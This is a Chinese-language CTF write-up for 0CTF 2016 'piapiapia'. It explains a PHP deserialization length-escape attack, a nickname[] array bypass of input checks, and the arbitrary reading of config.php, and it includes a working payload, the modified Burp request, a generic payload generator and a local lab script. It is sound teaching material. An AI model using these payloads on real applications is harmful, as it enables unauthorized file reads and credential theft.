---
title: "[0CTF 2016] piapiapia：PHP 反序列化长度逃逸与数组绕过"
date: 2026-11-03 19:30:00
updated: 2026-11-03 19:30:00
categories:
  - CTF
  - Web
  - 反序列化
tags:
  - PHP 反序列化
  - 长度逃逸
  - 数组绕过
  - 源码泄露
  - dirsearch
  - Burp Suite
  - CTF
description: 登录页背后是一个「注册 → 填资料 → 序列化入库」的小系统。filter 把 where 换成 hacker，每换一次多一个字节；34 个 where 正好把序列化字符串撑开，再配合 nickname[] 绕过长度检查，就能让 photo 指向 config.php，把 flag 读出来。
difficulty: 入门
topic: 反序列化
series: 反序列化
series_order: 1
permalink: 2026/11/03/web-ctf-piapiapia/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（先看懂 PHP 序列化的格式，后面都是体力活）
- **考点**：源码泄露、PHP 序列化格式、反序列化长度逃逸、数组绕过 `preg_match` / `strlen`
- **工具**：dirsearch、Burp Suite、CyberChef
- **关键文件**：`www.zip`、`class.php`、`update.php`、`profile.php`
- **关键 payload**：`where` × 34 + `";}s:5:"photo";s:10:"config.php";}`
- **flag**：`CTF2{5cbf0ff7-0295-4def-97b9-0e5f54ebf89b}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：PHP 基本语法、知道什么是 `serialize` / `unserialize` 更好；没学过也没关系，第六步会从头讲格式
- **工具**：Kali（自带 dirsearch）、Burp Suite（社区版就够）、CyberChef（网页版即可）
- **环境**：文中的靶场是当时开的临时环境，现在多半已经失效。第十一步给了一个**本地复现脚本**，照着跑也能完整理解漏洞
- 本文所有测试仅用于**授权靶场和本地环境**，请勿对未授权的站点做扫描或攻击
{% endnote %}

{% note default %}
**做题路线**

`打开登录页` → `dirsearch 扫目录` → `下载 www.zip 看源码` → `理清 注册/登录/填资料/看资料 的数据流` → `盯上 serialize + filter + unserialize` → `发现 where → hacker 会变长` → `构造 204 字节的 nickname payload` → `用 nickname[] 绕过长度检查` → `Burp 发包` → `profile.php 读出 config.php` → `base64 解码拿 flag`
{% endnote %}

## 第一步：打开页面，只有一个登录框

访问靶场，迎面就是一只趴在键盘上的猫，下面是一个登录框：

![登录页](image.png)

*图 1：只有 Username / Password，没有注册入口，也没有多余提示*

很多同学到这里就卡住了：没有账号，登录个啥？

先别急着猜密码。Web 题的第一反应应该是**找源码**。页面上看不到注册链接，不代表 `register.php` 不存在；登录框背后这个系统大概率有一套完整的「注册 → 登录 → 填资料」流程，只是没把入口露出来。

所以下一步不是爆破，而是扫目录。

{% note info %}
看到登录框先做三件事：

1. `Ctrl+U` 看页面源码，找注释、隐藏链接、被注释掉的功能入口；
2. 试 `/robots.txt`、`/sitemap.xml`；
3. 上目录扫描，把没被链接出来的文件找出来。

本题前两步没有直接收获，第三步一炮命中。
{% endnote %}

## 第二步：dirsearch 扫出 www.zip

dirsearch 会拿字典挨个请求路径，按状态码和响应长度判断文件存不存在：

```bash
dirsearch -u http://fb52abf80cc133f18d7bc385.http-ctf2.dasctf.com/
```

输出里有几条值得停下来看的：

```text
[01:36:41] 200 -     0B - /config.php
[01:36:51] 200 -    6KB - /favicon.ico
[01:37:15] 200 -    11B - /profile.php
[01:37:16] 200 -   797B - /register.php
[01:37:16] 200 -    46B - /robots.txt
[01:37:19] 301 -   185B - /static -> .../static/
[01:37:21] 200 -    11B - /update.php
[01:37:22] 301 -   185B - /upload -> .../upload/
[01:37:22] 200 -   403B - /upload/
[01:37:29] 200 -   392KB - /www.zip
```

![dirsearch 结果](image-1.png)

*图 2：`www.zip` 有 392KB，一眼就是源码包*

怎么读这份结果：

| 路径 | 状态码 | 大小 | 说明 |
| --- | --- | --- | --- |
| `/config.php` | 200 | **0B** | 文件存在，但被 PHP 执行后没有输出——里面多半只有变量定义 |
| `/profile.php` | 200 | 11B | 存在，但直接访问会提示 `Login First` |
| `/register.php` | 200 | 797B | **注册页，入口找到了** |
| `/update.php` | 200 | 11B | 存在，同样要登录 |
| `/upload/` | 200 | 403B | 上传目录存在，可能开了目录浏览 |
| `/www.zip` | 200 | **392KB** | **源码压缩包，直接下载** |

`/config.php` 返回 0 字节这条特别重要。PHP 文件被服务器执行后，变量定义不会输出，所以是 0 字节——**这不代表文件是空的**。我们后面要读的就是它。

把源码包下载下来：

```bash
wget http://fb52abf80cc133f18d7bc385.http-ctf2.dasctf.com/www.zip
unzip www.zip
```

解压得到六个文件：

```text
class.php  config.php  index.php  profile.php  register.php  update.php
```

{% note success %}
**`www.zip` 是 Web 题的经典泄露点。** 除了 `www.zip`，还可以顺手试 `wwwroot.zip`、`web.zip`、`backup.zip`、`source.zip`、`html.zip`。看到「登录框 + 没入口」的组合，优先找源码，比瞎猜参数高效得多。
{% endnote %}

## 第三步：六个文件，先理清这套系统在干嘛

别一上来就逐行抠代码，先把每个文件的职责分清楚（建议自己先通读一遍源码，再往下看）：

| 文件 | 作用 |
| --- | --- |
| `index.php` | 登录页，校验账号密码，成功后把用户名写进 `$_SESSION` |
| `register.php` | 注册页，用户名/密码长度限制 3~16 |
| `update.php` | 登录后填资料：电话、邮箱、昵称、头像 |
| `profile.php` | 登录后看资料，把头像以 base64 塞进 `<img src>` |
| `class.php` | 核心类 `user`（继承 `mysql`），封装注册、登录、查资料、改资料 |
| `config.php` | 数据库配置，**线上版本里还定义了 `$flag`** |

`config.php` 长这样：

```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```

压缩包里的 `config.php` 是「空壳版」，密码和 flag 都是空的；线上服务器那份才填了真值：

```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = 'qwertyuiop';
	$config['database'] = 'challenges';
	$flag = 'CTF2{...}';
?>
```

所以思路很自然：**能不能让服务器把线上的 `config.php` 读给我们看？**

## 第四步：数据是怎么流的——从填资料到看资料

整套系统的数据流其实就一条线，把两个文件对着看就明白了。

### 4.1 填资料：`update.php`

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
```

关键的最后两行：

```php
$profile['photo'] = 'upload/' . md5($file['name']);
$user->update_profile($username, serialize($profile));
```

用户填的四个字段被塞进 `$profile` 数组，**先 `serialize()` 成字符串，再交给 `update_profile()` 存进数据库**。

### 4.2 存资料：`class.php` 里的 `update_profile`

```php
public function update_profile($username, $new_profile) {
	$username = parent::filter($username);
	$new_profile = parent::filter($new_profile);

	$where = "username = '$username'";
	return parent::update($this->table, 'profile', $new_profile, $where);
}
```

注意顺序：**先 `filter()`，再写进数据库**。也就是说，数据库里存的不是原始的序列化字符串，而是被过滤过一遍的版本。

### 4.3 看资料：`profile.php`

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
```

关键的一行：

```php
$photo = base64_encode(file_get_contents($profile['photo']));
```

`$profile['photo']` 是从数据库里反序列化出来的，然后被当成**文件路径**，直接 `file_get_contents()` 读出来、base64 编码、塞进 `<img src="data:image/gif;base64,...">`。

我们的目标一下就明确了：

> 让反序列化后的 `$profile['photo']` 等于 `config.php`，`profile.php` 就会把 flag 源码当作「头像」读出来。

问题是：`update.php` 里 `$profile['photo']` 被写死成上传路径 `upload/xxx`，我们没法直接传。

**唯一的自由输入是 `nickname`。** 它会被序列化进字符串里，也就会进入反序列化的解析过程。能不能借 `nickname` 把 `photo` 顶掉？

能。但得先过两道关：`filter()` 和长度检查。

## 第五步：`filter()` 里藏了一个「长度 +1」

`class.php` 里的 `mysql::filter()`：

```php
public function filter($string) {
	$escape = array('\'', '\\\\');
	$escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);

	$safe = array('select', 'insert', 'update', 'delete', 'where');
	$safe = '/' . implode('|', $safe) . '/i';
	return preg_replace($safe, 'hacker', $string);
}
```

拆开看它做了两件事：

1. 把单引号 `'` 和反斜杠 `\` 换成下划线 `_`——防 SQL 注入的老套路；
2. 把 `select`、`insert`、`update`、`delete`、`where` 这些 SQL 关键字替换成 `hacker`。

第一眼看，关键字被替换了，SQL 注入确实没戏。但第二眼看长度：

| 原词 | 替换成 | 长度变化 |
| --- | --- | --- |
| `select` | `hacker` | 6 → 6，不变 |
| `insert` | `hacker` | 6 → 6，不变 |
| `update` | `hacker` | 6 → 6，不变 |
| `delete` | `hacker` | 6 → 6，不变 |
| **`where`** | **`hacker`** | **5 → 6，多 1 字节** |

只有 `where` 变长了。每出现一次 `where`，字符串就多一个字符。

这本来无所谓——多一个字符而已。**但序列化字符串是带长度标记的。**

## 第六步：先搞懂 PHP 序列化长什么样

在构造 payload 之前，必须先把 `serialize()` 的格式看明白。正常填一份资料：

```text
phone    = 13800138000
email    = a@b.com
nickname = test
photo    = upload/123
```

`serialize($profile)` 的结果是：

```text
a:4:{s:5:"phone";s:11:"13800138000";s:5:"email";s:7:"a@b.com";s:8:"nickname";s:4:"test";s:5:"photo";s:10:"upload/123";}
```

逐个拆：

| 片段 | 含义 |
| --- | --- |
| `a:4:{...}` | 数组，共 4 个元素 |
| `s:5:"phone";` | 字符串，长度 5，内容 `phone`（键名） |
| `s:11:"13800138000";` | 字符串，长度 11，内容 `13800138000`（值） |
| `s:8:"nickname";` | 键名 `nickname`，长度 8 |
| `s:4:"test";` | 值 `test`，长度 4 |
| `s:5:"photo";s:10:"upload/123";` | 最后一个键值对 |
| 末尾的 `}` | 数组结束 |

重点在 `s:长度:"内容"` 这个结构：**PHP 反序列化时会严格按声明的长度读取内容，读满就停**，不会管你内容里有什么花活。

正常情况这个长度是准的。但如果字符串在序列化**之后**被改了长度，而标记没跟着改，就会出问题——这正是 `filter()` 干的事。

{% note warning %}
**长度逃逸的本质**：`serialize()` 先写好「这个字符串有 204 个字节」，`filter()` 再把内容换成更长的版本。等 `unserialize()` 来读的时候，它仍然只读 204 个字节，**多出来的内容就被当成语法解析了**。
{% endnote %}

## 第七步：构造 payload，让 `photo` 指向 `config.php`

我们的目标：反序列化之后，数组里有一个 `photo` 键，值是 `config.php`。

### 7.1 先算长度

构造的 payload 分两段：

```text
[170 字节的 where] + [34 字节的逃逸尾巴]
```

尾巴是这 34 个字符：

```text
";}s:5:"photo";s:10:"config.php";}
```

数一下：`"` + `;` + `}` + `s:5:"photo";` + `s:10:"config.php";` + `}` = 1 + 1 + 1 + 12 + 18 + 1 = **34**。

前面放 170 字节的 `where`，也就是 34 个 `where`（34 × 5 = 170）。总长度：

```text
170 + 34 = 204
```

为什么要凑 204？因为 `filter()` 会把 34 个 `where` 变成 34 个 `hacker`：

```text
34 × 6 = 204
```

**过滤后的前 204 字节，恰好全是 `hacker`；而序列化标记里写的长度也是 204。** 于是 `unserialize()` 读完这 204 字节就停下，后面的 34 字节尾巴就被当成了真正的语法。

### 7.2 payload 本体

```text
wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

共 204 个字符：34 个 `where` + 34 字节尾巴。

### 7.3 为什么 `nickname` 必须是数组

这里有一个很多 writeup 没讲清楚的细节：**`nickname` 必须以数组形式提交（`nickname[]=...`）**，不能是普通字符串。

因为 `update.php` 里 `$profile['nickname'] = $_POST['nickname'];`，如果 `nickname` 是数组，序列化时会多套一层 `a:1:{i:0;...}`：

```text
a:4:{
  s:5:"phone";    s:11:"13800138000";
  s:5:"email";    s:7:"a@b.com";
  s:8:"nickname"; a:1:{ i:0; s:204:"[170 个 where + 逃逸尾巴]"; }
  s:5:"photo";    s:10:"upload/123";
}
```

（实际是一行，为了阅读加了换行。）

过滤之后的完整字符串是：

```text
a:4:{s:5:"phone";s:11:"13800138000";s:5:"email";s:7:"a@b.com";s:8:"nickname";a:1:{i:0;s:204:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:10:"upload/123";}
```

现在让 PHP 的解析器从头走一遍：

| 步骤 | 读到的内容 | 解析动作 |
| --- | --- | --- |
| 1 | `s:204:"hacker...hacker"` | 读满 204 字节，正好是 34 个 `hacker` |
| 2 | `"` | 字符串结束 |
| 3 | `;` | 键值对结束 |
| 4 | `}` | **关掉内层 `a:1` 数组（nickname 这个数组）** |
| 5 | `s:5:"photo";s:10:"config.php";` | 成为外层数组的第 4 个键值对：`photo = config.php` |
| 6 | `}` | 关掉外层 `a:4` 数组 |
| 7 | `";}s:5:"photo";s:10:"upload/123";}` | 剩余 34 字节，**作为多余数据被忽略** |

最终反序列化结果：

```php
[
    'phone'    => '13800138000',
    'email'    => 'a@b.com',
    'nickname' => ['hackerhacker...hacker'],  // 34 个 hacker 组成的数组
    'photo'    => 'config.php'                 // 被我们顶掉了
]
```

第 4 步的 `}` 是关键：如果 `nickname` 是普通字符串，序列化时没有内层 `a:1`，这个 `}` 会直接关掉外层数组，`photo` 就没了。**数组既帮我们过了长度检查，又提供了这层「多出来的 `}`」。**

## 第八步：绕过 `nickname` 的长度检查

`update.php` 对昵称的限制是：

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
	die('Invalid nickname');
```

- 只允许字母、数字、下划线——我们的 payload 里有 `"`、`;`、`{`、`}`，正则直接挂；
- 长度不能超过 10——我们的 payload 有 204 个字符。

正常填写当然过不去：

![Invalid nickname](image-4.png)

*图 3：把 payload 直接粘进昵称框，页面只回一句 `Invalid nickname`*

但这两道检查都有一个前提：**`$_POST['nickname']` 是字符串**。

如果传的是数组呢？在 PHP 5.6 下：

- `preg_match('/.../', array)`：报 warning，返回 `false`；
- `strlen(array)`：报 warning，返回 `null`；
- 条件变成 `false || (null > 10)`，也就是 `false || false`，整个 `if` 不成立，**直接放行**。

所以把字段名从 `nickname` 改成 `nickname[]` 就绕过去了。

{% note warning %}
**这是 PHP 5.x 的行为。** 在 PHP 8 里，`preg_match()` 和 `strlen()` 收到数组会直接抛 `TypeError`，页面 500，绕过失效。本题靶场响应头是 `X-Powered-By: PHP/5.6.40`，所以能用。做老题时看到「数组传参绕过正则」不生效，先确认 PHP 版本。
{% endnote %}

## 第九步：动手打一遍

前面的分析都齐了，接下来是实际发包。

### 9.1 注册并登录

先访问注册页：

```text
http://靶场地址/register.php
```

![注册页](image-2.png)

*图 4：注册页，用户名和密码都是 3~16 位*

随便注册一个，比如 `test` / `123456`，然后去 `index.php` 登录。登录成功后因为资料还没填，`profile.php` 会把你重定向到 `update.php`：

![填资料页](image-3.png)

*图 5：电话、邮箱、昵称、头像四个字段*

先正常填一份：

| 字段 | 值 | 要求 |
| --- | --- | --- |
| Phone | `13800138000` | 正好 11 位数字 |
| Email | `a@b.com` | 要匹配那个邮箱正则 |
| Nickname | `test` | 字母数字下划线，≤10 位 |
| Photo | 任意一张小图片 | 大于 5 字节、小于 1MB |

提交后应该看到 `Update Profile Success!`，点进 `profile.php` 能看到 `Hi test`。

### 9.2 用 Burp 改包

打开 Burp 的 Proxy，把浏览器的 `update.php` 提交请求拦下来。原始请求是一个 `multipart/form-data`，里面能找到这一段：

```text
Content-Disposition: form-data; name="nickname"

test
```

改两个地方：

1. 字段名：`name="nickname"` → `name="nickname[]"`
2. 字段值：`test` → 204 字节的 payload

改完长这样（Burp 里是一整行）：

```text
Content-Disposition: form-data; name="nickname[]"

wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
```

其他字段和文件原样保留，Forward 发包。

{% note info %}
**为什么字段名是 `nickname[]` 而不是 `nickname`？**

方括号是 PHP 的表单数组语法：`nickname[]=a&nickname[]=b` 会让 `$_POST['nickname']` 变成 `['a','b']`。在 multipart 里直接写字段名 `nickname[]` 就行，不用额外编码；如果用的是 `application/x-www-form-urlencoded`，要写成 `nickname%5B%5D=...`。
{% endnote %}

### 9.3 看响应

响应里会出现两条 warning，但最后依然是成功：

```html
<b>Warning</b>:  preg_match() expects parameter 2 to be string, array given in <b>/var/www/html/update.php</b> on line <b>15</b>
<b>Warning</b>:  strlen() expects parameter 1 to be string, array given in <b>/var/www/html/update.php</b> on line <b>15</b>
Update Profile Success!<a href="profile.php">Your Profile</a>
```

![Burp 发包成功](image-5.png)

*图 6：warning 是数组绕过留下的痕迹，`Update Profile Success!` 说明数据已经写进库了*

这两条 warning 不是坏事，反而证明我们猜对了：`preg_match` 和 `strlen` 确实收到了数组。

### 9.4 访问 `profile.php` 读文件

带着同一个 Cookie 访问：

```text
http://靶场地址/profile.php
```

响应里的头像变成了一个巨大的 base64 字符串：

```html
<h3>Hi Array</h3>
...
<img src="data:image/gif;base64,PD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOw..."
```

![profile 响应里的 base64](image-6.png)

*图 7：`Hi Array` 再次说明 nickname 是数组；img 的 base64 其实是 `config.php` 的源码*

`file_get_contents($profile['photo'])` 读的是 `config.php`，读出来的内容被当成图片编码进了 `data:image/gif;base64,...`。浏览器当然渲染不出来——它不是图片——但 base64 文本就明晃晃地躺在响应里。

两个细节：

- `Hi Array`：`$profile['nickname']` 是个数组，`echo` 数组只能输出 `Array`；
- base64 前面有 `data:image/gif;base64,` 前缀，复制的时候**只复制 `base64,` 后面那一长串**。

### 9.5 CyberChef 解码

把 base64 丢进 CyberChef，用 `From Base64`，勾上 `Remove non-alphabet chars`（防止把前缀或换行带进去）：

![CyberChef 解码](image-7.png)

*图 8：解码后直接看到 `config.php` 的源码，flag 在最下面*

得到：

```php
<?php
$config['hostname'] = '127.0.0.1';
$config['username'] = 'root';
$config['password'] = 'qwertyuiop';
$config['database'] = 'challenges';
$flag = 'CTF2{5cbf0ff7-0295-4def-97b9-0e5f54ebf89b}';
?>
```

flag：

```text
CTF2{5cbf0ff7-0295-4def-97b9-0e5f54ebf89b}
```

{% note success %}
**为什么头像能读任意文件？** `profile.php` 把 `$profile['photo']` 直接当路径传给 `file_get_contents()`，没有任何白名单或路径限制。正常流程里这个值只能是 `upload/xxx`，但反序列化让我们把它改成了任意字符串。这就是「反序列化可控 → 任意文件读取」。
{% endnote %}

## 第十步：payload 的通用算法

这道题的 payload 不是背出来的，是可以算出来的。设 `where` 出现 `n` 次：

- 原始长度：`5n + 34`（34 是尾巴长度）
- 过滤后长度：`6n + 34`（每个 `where` 变长 1 字节）
- `unserialize()` 只会读 `5n + 34` 个字节
- 想让读到的内容恰好全是 `hacker`，需要：`6n = 5n + 34`

解得：

```text
n = 34
```

所以 payload 长度是 `5 × 34 + 34 = 204`，过滤后前 204 字节正好是 34 个 `hacker`。

换个文件名也一样，`where` 的数量会跟着尾巴长度自动变化：

```php
<?php
$target = 'config.php';                       // 想读的文件
$tail   = '";}s:5:"photo";s:' . strlen($target) . ':"' . $target . '";}';
$n      = strlen($tail);                      // 尾巴多长，就放多少个 where
$payload = str_repeat('where', $n) . $tail;

echo strlen($payload);                        // config.php => 204
```

比如读 `flag.php`（8 个字符），尾巴变成 `";}s:5:"photo";s:8:"flag.php";}`，长度 31，于是放 31 个 `where`，payload 长度是 `5 × 31 + 31 = 186`。

{% note warning %}
**别手数 `where`。** 数错一个，整个 payload 就崩了。用一行 PHP 生成最稳：

```php
<?php
echo str_repeat('where', 34) . '";}s:5:"photo";s:10:"config.php";}';
```

生成完用 `strlen()` 确认长度是 204。
{% endnote %}

## 第十一步：本地复现一遍

靶场关了也能玩。下面这个脚本把核心逻辑抽出来，不需要 MySQL，直接用 PHP 跑：

```php
<?php
// 复刻 class.php 里的 filter
function filter($string) {
    $escape = array('\'', '\\\\');
    $escape = '/' . implode('|', $escape) . '/';
    $string = preg_replace($escape, '_', $string);

    $safe = array('select', 'insert', 'update', 'delete', 'where');
    $safe = '/' . implode('|', $safe) . '/i';
    return preg_replace($safe, 'hacker', $string);
}

// 模拟 update.php：nickname 以数组形式提交
$payload = str_repeat('where', 34) . '";}s:5:"photo";s:10:"config.php";}';
$profile = [
    'phone'    => '13800138000',
    'email'    => 'a@b.com',
    'nickname' => [$payload],
    'photo'    => 'upload/123',
];

$serialized = serialize($profile);
$stored     = filter($serialized);   // 入库前过滤

echo "payload 长度: " . strlen($payload) . PHP_EOL;
echo "过滤前长度: " . strlen($serialized) . PHP_EOL;
echo "过滤后长度: " . strlen($stored) . PHP_EOL;

$parsed = @unserialize($stored);     // PHP 8 会提示 Extra data，属预期，加 @ 静音
var_dump($parsed['photo']);          // string(10) "config.php"
```

运行：

```bash
php lab.php
```

输出：

```text
payload 长度: 204
过滤前长度: 331
过滤后长度: 365
string(10) "config.php"
```

`photo` 从 `upload/123` 变成了 `config.php`，漏洞复现成功。

想再真实一点，可以在同目录放一个 `config.php`，把脚本最后改成：

```php
<?php
echo file_get_contents(unserialize($stored)['photo']);
```

就能像 `profile.php` 一样把文件内容读出来。

{% note info %}
**本地实验只用于理解原理。** 真实的完整环境还需要 PHP 5.6（`mysql_*` 扩展在 PHP 7 已移除，数组绕过在 PHP 8 会抛 `TypeError`）和 MySQL。复现核心的反序列化逻辑，用上面的脚本就够了。

在 PHP 8 上跑脚本可能多一条 `unserialize(): Extra data starting at offset 331` 的 warning——这正是那 34 字节逃逸尾巴被忽略的正常现象，所以脚本里用了 `@unserialize()` 静音。靶场（PHP 5.6）的页面上没有这条提示，可以直接忽略。
{% endnote %}

## 第十二步：踩坑记录与复盘

### 12.1 常见坑

| 坑 | 现象 | 原因 / 解决 |
| --- | --- | --- |
| 昵称直接填 payload | `Invalid nickname` | 被正则和长度检查拦下，必须用 `nickname[]` |
| 字段名写成 `nickname` | 同上 | 数组语法是 `nickname[]`，方括号不能少 |
| `where` 数量数错 | `unserialize()` 返回 `false`，页面报错或空白 | 用 `str_repeat('where', 34)` 生成，别手数 |
| 尾巴里文件名长度没改 | 反序列化失败 | `s:10` 是 `config.php` 的长度，换文件要同步改 |
| 用了单引号 | payload 被 `filter` 换成 `_` | payload 里全用双引号，`filter` 只替换单引号和反斜杠 |
| 复制 base64 带上前缀 | CyberChef 解码报错 | 只复制 `data:image/gif;base64,` 后面的内容 |
| 上传图片太小 | `Photo size error` | 文件要大于 5 字节 |
| Cookie 丢了 | `Login First` | 注册、登录、发 payload、访问 profile 要用同一个会话 |
| 在 PHP 8 上复现 | 500 / `TypeError` | 数组绕过依赖 PHP 5.x 的 warning 行为 |

### 12.2 这道题到底考了什么

把整个过程压缩成一句话：

> **过滤器改变了字符串长度，序列化却仍然相信旧的长度标记。**

三个条件缺一不可：

1. **有 `serialize()` 和 `unserialize()`**：数据在「字符串」和「数组」之间来回转换；
2. **过滤发生在序列化之后、反序列化之前**：`update.php` 先 `serialize()`，`update_profile()` 再 `filter()`，`profile.php` 最后 `unserialize()`；
3. **过滤会改变长度**：`where` → `hacker`，5 字节变 6 字节。

再加一个「顺手的漏洞」：`preg_match()` / `strlen()` 收到数组时只报 warning，让超长 payload 混进了数据库。

### 12.3 遇到同类题怎么想

看到下面这些关键词，就该往「长度逃逸」方向想：

- 源码里同时出现 `serialize()` 和 `unserialize()`；
- 中间夹着一个 `preg_replace()` / `str_replace()` 之类的过滤器；
- 过滤规则是「短词换长词」或者「长词换短词」；
- 用户输入被拼进序列化字符串，且没有重新计算长度。

排查顺序：

1. 找到「序列化 → 过滤 → 入库 → 反序列化」的完整链路；
2. 算清楚过滤器让字符串变长还是变短、每次变多少；
3. 找到序列化里长度标记 `s:N` 的位置；
4. 构造「填充词 + 逃逸尾巴」，让过滤后的前 N 字节刚好是填充词；
5. 确认能不能用数组、大小写、编码等方式绕过输入检查。

{% note info %}
**PHP 8 的变化**：从 PHP 8.0 开始，很多「传错类型只报 warning」的行为改成了抛异常（`TypeError`），这类数组绕过会直接失效。另外，PHP 7 起 `mysql_*` 系列函数被移除，老题目通常跑在 PHP 5.6 的 Docker 镜像里。
{% endnote %}

## 总结

这道题看起来是一堆 PHP 文件，其实就一条链：

```text
注册登录
  → update.php 把四个字段 serialize() 成字符串
  → update_profile() 用 filter() 过滤
  → where → hacker，每个多 1 字节，但长度标记没变
  → 34 个 where 恰好撑出 204 字节
  → nickname[] 绕过正则和长度检查
  → 逃逸尾巴把 photo 改成 config.php
  → profile.php unserialize() 后 file_get_contents('config.php')
  → base64 解码拿 flag
```

最后再念一遍口诀：

> **序列化信长度，过滤器改内容；长度对不上，尾巴变语法。**

flag：`CTF2{5cbf0ff7-0295-4def-97b9-0e5f54ebf89b}`
